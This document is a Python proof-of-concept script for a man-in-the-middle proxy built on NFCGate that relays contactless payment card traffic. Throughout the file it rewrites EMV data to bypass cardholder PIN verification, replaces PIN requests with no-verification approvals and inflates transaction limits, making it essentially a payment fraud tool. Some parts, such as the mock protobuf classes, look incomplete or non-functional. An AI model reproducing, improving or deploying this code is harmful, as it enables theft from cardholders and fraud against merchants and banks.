#!/usr/bin/env python3
"""
Minimal NFCGate MITM Proxy for PIN Bypass Proof of Concept
Mimics NFCGate app's protobuf-like session handling with immediate data
"""

import socket
import threading
import json
import struct
import os
import time
import re
import logging
from datetime import datetime
from binascii import hexlify, unhexlify
from Crypto.PublicKey import RSA
from Crypto.Signature import pkcs1_15
from Crypto.Hash import SHA256

PROTOBUF_AVAILABLE = False

# Mock protobuf classes for fallback
class NFCData:
    def __init__(self):
        self.data = b''

class Anticol:
    def __init__(self):
        self.uid = b''

class Status:
    def __init__(self):
        self.code = 0
        self.message = ''

class Data:
    def __init__(self):
        self.payload = b''

class Session:
    def __init__(self):
        self.session_id = ''
        self.status = 0

class Wrapper:
    def __init__(self):
        self.message = None

    def WhichOneof(self, field):
        if self.message:
            return type(self.message).__name__
        return None

    def SerializeToString(self):
        return b''

    def ParseFromString(self, data):
        pass

class NFCGateMITM:
    def __init__(self, config_file='config.json'):
        # Setup logging
        self.logger = logging.getLogger('NFCGateMITM')
        self.logger.setLevel(logging.DEBUG)
        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')

        # Console handler (INFO level)
        console_handler = logging.StreamHandler()
        console_handler.setLevel(logging.INFO)
        console_handler.setFormatter(formatter)
        self.logger.addHandler(console_handler)

        # File handler (DEBUG level, append mode)
        file_handler = logging.FileHandler('mitm_log.txt', mode='a')
        file_handler.setLevel(logging.DEBUG)
        file_handler.setFormatter(formatter)
        self.logger.addHandler(file_handler)

        # Load configuration
        with open(config_file, 'r') as f:
            config = json.load(f)
        self.mitm_port = config.get('mitm_port', 8080)
        self.nfcgate_host = config.get('nfcgate_host', 'localhost')
        self.nfcgate_port = config.get('nfcgate_port', 5566)
        self.bypass_pin = config.get('bypass_pin', True)
        self.change_amount = config.get('change_amount', False)
        self.remove_auth = config.get('remove_auth', True)

        # Load RSA private key
        with open('keys/private.pem', 'rb') as f:
            self.private_key = RSA.import_key(f.read())

        self.is_running = False
        self.mitm_socket = None
        self.reader_server_socket = None
        self.tag_server_socket = None
        self.session_id = 1
        self.clients = {}
        self.server_connected = False
        self.heartbeat_thread = None
        self.pin_patterns = [
            b'PIN_REQUIRED',
            b'ENTER_PIN',
            b'pin_verification',
            b'cardholder_verification',
            b'CVM_PIN',
            b'PIN_VERIFY',
            b'PLEASE_ENTER_PIN'
        ]

    def protobuf_to_dict(self, wrapper):
        """Manual conversion of Wrapper protobuf to dict"""
        msg_type = wrapper.WhichOneof('message')
        if msg_type == 'NFCData':
            return {'type': 'NFCData', 'data': hexlify(wrapper.NFCData.data).decode()}
        elif msg_type == 'Anticol':
            return {'type': 'Anticol', 'uid': hexlify(wrapper.Anticol.uid).decode()}
        elif msg_type == 'Status':
            return {'type': 'Status', 'code': wrapper.Status.code, 'message': wrapper.Status.message}
        elif msg_type == 'Data':
            return {'type': 'Data', 'payload': hexlify(wrapper.Data.payload).decode()}
        elif msg_type == 'Session':
            return {'type': 'Session', 'session_id': wrapper.Session.session_id, 'status': wrapper.Session.status}
        return {'type': 'unknown'}

    def dict_to_protobuf(self, data_dict):
        """Manual conversion of dict to Wrapper protobuf"""
        wrapper = Wrapper()
        msg_type = data_dict.get('type')
        if msg_type == 'NFCData':
            wrapper.NFCData.data = unhexlify(data_dict.get('data', ''))
        elif msg_type == 'Anticol':
            wrapper.Anticol.uid = unhexlify(data_dict.get('uid', ''))
        elif msg_type == 'Status':
            wrapper.Status.code = data_dict.get('code', 0)
            wrapper.Status.message = data_dict.get('message', '')
        elif msg_type == 'Data':
            wrapper.Data.payload = unhexlify(data_dict.get('payload', ''))
        elif msg_type == 'Session':
            wrapper.Session.session_id = data_dict.get('session_id', '')
            wrapper.Session.status = data_dict.get('status', 0)
        return wrapper

    def parse_tlv(self, data):
        """Parse TLV data structure, skipping 5-byte header if present"""
        if len(data) >= 5 and data[4:5] in (b'\x01', b'\x02', b'\x03'):
            data = data[5:]
        tlvs = []
        i = 0
        while i < len(data):
            tag = data[i]
            i += 1
            if (tag & 0x1F) == 0x1F:
                tag_bytes = [tag]
                while i < len(data) and (data[i] & 0x80):
                    tag_bytes.append(data[i])
                    i += 1
                if i < len(data):
                    tag_bytes.append(data[i])
                    i += 1
                tag = int.from_bytes(bytes(tag_bytes), 'big')

            if i >= len(data):
                break

            length = data[i]
            i += 1
            if length & 0x80:
                num_len_bytes = length & 0x7F
                if i + num_len_bytes > len(data):
                    break
                length = int.from_bytes(data[i:i+num_len_bytes], 'big')
                i += num_len_bytes

            if i + length > len(data):
                break

            value = data[i:i+length]
            i += length

            children = self.parse_tlv(value) if (tag & 0x20) == 0x20 else None
            tlvs.append({'tag': tag, 'length': length, 'value': value, 'children': children})
        return tlvs

    def build_tlv(self, tlvs):
        """Build TLV data structure"""
        result = bytearray()
        for tlv in tlvs:
            tag = tlv['tag']
            tag_bytes = tag.to_bytes(1, 'big') if tag <= 0xFF else tag.to_bytes((tag.bit_length() + 7) // 8, 'big')
            value = self.build_tlv(tlv['children']) if tlv['children'] else tlv['value']
            length = len(value)
            length_bytes = length.to_bytes(1, 'big') if length < 0x80 else bytes([0x80 | ((length.bit_length() + 7) // 8)]) + length.to_bytes((length.bit_length() + 7) // 8, 'big')
            result.extend(tag_bytes)
            result.extend(length_bytes)
            result.extend(value)
        return bytes(result)

    def find_tlv(self, tlvs, tag):
        """Find TLV by tag"""
        for tlv in tlvs:
            if tlv['tag'] == tag:
                return tlv
            if tlv['children']:
                found = self.find_tlv(tlv['children'], tag)
                if found:
                    return found
        return None

    def get_scheme_from_tlvs(self, tlvs):
        """Detect card scheme from TLVs"""
        pan_tlv = self.find_tlv(tlvs, 0x5A)
        if pan_tlv and len(pan_tlv['value']) > 0:
            first_digit = (pan_tlv['value'][0] >> 4) & 0x0F
            schemes = {3: 'Amex', 4: 'Visa', 5: 'Mastercard', 6: 'Discover'}
            return schemes.get(first_digit, 'Unknown')
        
        # Fallback to AID if no PAN
        aid_tlv = self.find_tlv(tlvs, 0x4F) or self.find_tlv(tlvs, 0x9F06)
        if aid_tlv and len(aid_tlv['value']) >= 5:
            aid_prefix = aid_tlv['value'][:5]
            if aid_prefix == b'\xa0\x00\x00\x00\x03':
                return 'Visa'
            elif aid_prefix == b'\xa0\x00\x00\x00\x04':
                return 'Mastercard'
            elif aid_prefix == b'\xa0\x00\x00\x00\x25':
                return 'Amex'
            elif aid_prefix == b'\xa0\x00\x00\x01\x52' or aid_prefix == b'\xa0\x00\x00\x03\x24':
                return 'Discover'
            else:
                self.logger.debug(f"Unknown AID prefix: {hexlify(aid_prefix).decode()}")
                return 'Unknown'
        
        self.logger.debug("No PAN (0x5A) or AID (0x4F/0x9F06) tag found in TLVs")
        return 'Unknown'

    def bypass_tlv_modifications(self, tlvs):
        """Apply PIN bypass and auth removal modifications to TLVs"""
        if self.bypass_pin or self.remove_auth:
            for tag_hex, new_value_hex in [('9F17', '01'), ('9F36', '01'), ('9F6C', '01')]:
                tag = int(tag_hex, 16)
                new_value = unhexlify(new_value_hex)
                tlv = self.find_tlv(tlvs, tag)
                if tlv:
                    tlv['value'] = new_value
                    tlv['length'] = len(new_value)
                    tlv['children'] = None
            tlv = self.find_tlv(tlvs, 0x9F66)
            if tlv and len(tlv['value']) > 0:
                val = bytearray(tlv['value'])
                val[0] |= 0x04
                tlv['value'] = bytes(val)
                tlv['length'] = len(tlv['value'])
        return tlvs

    def override_transaction_limits(self, data):
        """Override transaction amount limits"""
        if not self.change_amount:
            return data
        try:
            data_str = data.decode('utf-8', errors='ignore')
            limit_overrides = {
                'contactless_limit': '999999.99',
                'pin_required_amount': '999999.99',
                'transaction_limit': '999999.99',
                'amount_limit': '999999.99'
            }
            for limit_field, new_value in limit_overrides.items():
                pattern = f'"{limit_field}":\\s*[\\d.]+'
                replacement = f'"{limit_field}": {new_value}'
                data_str = re.sub(pattern, replacement, data_str)
                pattern = f'{limit_field}=[\\d.]+'
                replacement = f'{limit_field}={new_value}'
                data_str = re.sub(pattern, replacement, data_str)
            return data_str.encode('utf-8', errors='ignore')
        except Exception as e:
            self.logger.error(f"Error overriding amount limits: {e}")
            return data

    def handle_pos_pin_request(self, data):
        """Handle POS/CC PIN requests"""
        if not (self.bypass_pin or self.remove_auth):
            return data
        try:
            if any(pattern in data for pattern in self.pin_patterns):
                self.logger.info("POS/CC PIN request detected, bypassing")
                try:
                    data_str = data.decode('utf-8')
                    if data_str.strip().startswith('{'):
                        json_data = json.loads(data_str)
                        json_data.update({
                            'pin_required': False,
                            'cardholder_verification': 'NONE',
                            'cvm_method': 'NO_CVM',
                            'contactless_approved': True,
                            'pin_bypass_applied': True,
                            'timestamp': datetime.now().isoformat()
                        })
                        return json.dumps(json_data).encode('utf-8')
                except:
                    pass
                return b'PIN_BYPASS_OK'
            return data
        except Exception as e:
            self.logger.error(f"Error handling POS PIN request: {e}")
            return data

    def detect_client_role(self, data):
        """Detect if client is reader or tag based on data"""
        reader_indicators = [b'TRANSACTION', b'PAYMENT', b'READER', b'POS', b'AMOUNT', b'PIN_REQUIRED']
        tag_indicators = [b'CARD_DATA', b'EMV_DATA', b'PAN', b'TAG', b'\x5A', b'\x9F']
        if len(data) >= 5:
            raw_data = data[5:]
        else:
            raw_data = data
        if raw_data in [b'\x08\x01', b'\x08\x02']:
            return 'heartbeat'
        if any(indicator in data for indicator in reader_indicators):
            return 'reader'
        if any(indicator in data for indicator in tag_indicators):
            return 'tag'
        return 'unknown'

    def sign_data(self, data):
        """Sign data with RSA private key"""
        h = SHA256.new(data)
        return pkcs1_15.new(self.private_key).sign(h)

    def apply_pin_bypass(self, data, client_role):
        """Apply PIN bypass, amount override, and POS/CC PIN handling"""
        try:
            # Strip 5-byte header if present
            if len(data) >= 5 and data[4:5] in (b'\x01', b'\x02', b'\x03'):
                raw_data = data[5:]
            else:
                raw_data = data

            if client_role == 'heartbeat':
                self.logger.debug(f"Heartbeat detected ({client_role}): {hexlify(raw_data).decode()}")
                return struct.pack("!IB", len(raw_data), self.session_id) + raw_data

            # Handle POS/CC PIN requests
            raw_data = self.handle_pos_pin_request(raw_data)

            # Apply amount overrides for JSON data
            if raw_data.startswith(b'{'):
                raw_data = self.override_transaction_limits(raw_data)
                self.logger.debug(f"Original NFC data ({client_role}): {hexlify(raw_data).decode()}")
                return struct.pack("!IB", len(raw_data), self.session_id) + raw_data

            # Process TLV data
            self.logger.debug(f"Original NFC data ({client_role}): {hexlify(raw_data).decode()}")
            tlvs = self.parse_tlv(raw_data)
            scheme = self.get_scheme_from_tlvs(tlvs)
            self.logger.info(f"Scheme detected ({client_role}): {scheme}")

            if self.bypass_pin or self.remove_auth:
                tlvs = self.bypass_tlv_modifications(tlvs)
                unsigned_data = self.build_tlv(tlvs)
                signature = self.sign_data(unsigned_data)
                tlvs.append({'tag': 0x9F45, 'length': len(signature), 'value': signature, 'children': None})
                modified_data = self.build_tlv(tlvs)
            else:
                modified_data = raw_data

            self.logger.debug(f"Modified NFC data ({client_role}): {hexlify(modified_data).decode()}")
            return struct.pack("!IB", len(modified_data), self.session_id) + modified_data
        except Exception as e:
            self.logger.error(f"Error in PIN bypass ({client_role}): {e}")
            return data

    def server_heartbeat(self, server_socket):
        """Send periodic heartbeats to maintain server connection"""
        while self.is_running and server_socket:
            try:
                heartbeat = b'\x08\x01'  # Mimic NFCGate app's heartbeat
                server_socket.send(struct.pack("!IB", len(heartbeat), self.session_id) + heartbeat)
                self.logger.info("Sent server heartbeat")
                time.sleep(5)
            except Exception as e:
                self.logger.error(f"Server heartbeat error: {e}")
                break

    def connect_to_server_role(self, role):
        """Connect to NFCGate server for a specific role"""
        max_retries = 5
        retry_delay = 2
        for attempt in range(max_retries):
            try:
                server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server_socket.connect((self.nfcgate_host, self.nfcgate_port))
                server_socket.settimeout(30.0)
                self.logger.info(f"Connected to NFCGate server for {role} at {self.nfcgate_host}:{self.nfcgate_port}")

                # Send session init message
                session_msg = b'\x08\x01' if role == 'reader' else b'\x08\x02'
                server_socket.send(struct.pack("!IB", len(session_msg), self.session_id) + session_msg)
                self.logger.info(f"Sent session init for {role}: session_id={self.session_id}")

                # Send immediate test data
                if role == 'reader':
                    test_data = json.dumps({
                        "type": "PIN_REQUIRED",
                        "card_number": "****1234",
                        "amount": "10000.00",
                        "merchant": "Test POS",
                        "timestamp": datetime.now().isoformat()
                    }).encode('utf-8')
                else:
                    test_data = b'CARD_DATA_EMV'
                server_socket.send(struct.pack("!IB", len(test_data), self.session_id) + test_data)
                self.logger.debug(f"Sent test data for {role}: {hexlify(test_data).decode()}")

                # Start heartbeat for this socket
                heartbeat_thread = threading.Thread(target=self.server_heartbeat, args=(server_socket,), daemon=True)
                heartbeat_thread.start()

                return server_socket
            except Exception as e:
                self.logger.error(f"Server connection attempt {attempt + 1}/{max_retries} for {role} failed: {e}")
                if attempt < max_retries - 1:
                    time.sleep(retry_delay)
        self.logger.error(f"All connection attempts to NFCGate server for {role} failed")
        return None

    def connect_to_server(self):
        """Connect to NFCGate server with separate sockets for reader and tag"""
        self.reader_server_socket = self.connect_to_server_role('reader')
        self.tag_server_socket = self.connect_to_server_role('tag')
        self.server_connected = self.reader_server_socket is not None and self.tag_server_socket is not None
        return self.server_connected

    def handle_server_recv(self, server_socket, role):
        """Handle receiving data from server for a role"""
        while self.is_running and server_socket:
            try:
                server_socket.settimeout(10.0)
                data = server_socket.recv(4096)
                if not data:
                    break
                self.logger.debug(f"Received data from server for {role}: {hexlify(data).decode()}")

                # Forward to the corresponding local client
                local_client = next((c for c in self.clients.values() if c['role'] != role and c['role'] != 'heartbeat' and c['role'] != 'unknown'), None)
                if local_client:
                    local_client['socket'].send(data)
                    self.logger.debug(f"Forwarded server data for {role} to local {local_client['role']}")
            except socket.timeout:
                continue
            except Exception as e:
                self.logger.error(f"Server recv error for {role}: {e}")
                break

    def start_server_recv_threads(self):
        if self.reader_server_socket:
            threading.Thread(target=self.handle_server_recv, args=(self.reader_server_socket, 'reader'), daemon=True).start()
        if self.tag_server_socket:
            threading.Thread(target=self.handle_server_recv, args=(self.tag_server_socket, 'tag'), daemon=True).start()

    def handle_client(self, client_socket, address):
        """Handle client connection (reader or tag)"""
        client_id = f"{address[0]}:{address[1]}"
        client_role = 'unknown'
        self.clients[client_id] = {'socket': client_socket, 'role': client_role, 'session_id': self.session_id}
        self.logger.info(f"Client connected: {client_id} (role: {client_role})")

        try:
            while self.is_running:
                try:
                    client_socket.settimeout(10.0)
                    data = client_socket.recv(4096)
                    if not data:
                        break

                    # Detect client role
                    client_role = self.detect_client_role(data)
                    self.clients[client_id]['role'] = client_role
                    self.logger.info(f"Updated client role: {client_id} ({client_role})")

                    # Apply PIN bypass and modifications
                    processed_data = self.apply_pin_bypass(data, client_role)

                    # Forward to the corresponding server socket
                    if self.server_connected:
                        server_socket = self.reader_server_socket if client_role == 'reader' else self.tag_server_socket
                        if server_socket:
                            server_socket.send(processed_data)

                    # Forward to other local client if any
                    for cid, client in self.clients.items():
                        if cid != client_id and client['socket'] is not client_socket and client['role'] != 'heartbeat':
                            try:
                                client['socket'].send(processed_data)
                                self.logger.debug(f"Forwarded data from {client_id} ({client_role}) to {cid} ({client['role']})")
                            except Exception as e:
                                self.logger.error(f"Error forwarding to {cid}: {e}")

                except socket.timeout:
                    continue
                except Exception as e:
                    self.logger.error(f"Client {client_id} ({client_role}) error: {e}")
                    break
        finally:
            client_socket.close()
            if client_id in self.clients:
                del self.clients[client_id]
            self.logger.info(f"Client disconnected: {client_id} ({client_role})")

    def start(self):
        """Start the MITM proxy"""
        if not self.connect_to_server():
            self.logger.warning("Warning: NFCGate server not connected, proceeding with local MITM only")
        else:
            self.logger.info("NFCGate server connected successfully")
            self.start_server_recv_threads()

        self.mitm_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.mitm_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.mitm_socket.bind(('0.0.0.0', self.mitm_port))
        self.mitm_socket.listen(5)
        self.is_running = True

        self.logger.info(f"MITM proxy started on port {self.mitm_port}")
        while self.is_running:
            try:
                self.mitm_socket.settimeout(1.0)
                client_socket, address = self.mitm_socket.accept()
                client_thread = threading.Thread(
                    target=self.handle_client,
                    args=(client_socket, address),
                    daemon=True
                )
                client_thread.start()
            except socket.timeout:
                continue
            except Exception as e:
                if self.is_running:
                    self.logger.error(f"MITM error: {e}")
                break

    def stop(self):
        """Stop the MITM proxy"""
        self.is_running = False
        if self.mitm_socket:
            self.mitm_socket.close()
        if self.reader_server_socket:
            self.reader_server_socket.close()
        if self.tag_server_socket:
            self.tag_server_socket.close()
        for client_id, client in list(self.clients.items()):
            client['socket'].close()
            del self.clients[client_id]
        self.logger.info("MITM proxy stopped")

def main():
    """Main function"""
    print("?? NFCGate MITM Proxy - PIN Bypass PoC")
    mitm = NFCGateMITM()
    try:
        mitm.start()
    except KeyboardInterrupt:
        mitm.stop()

if __name__ == "__main__":
    main()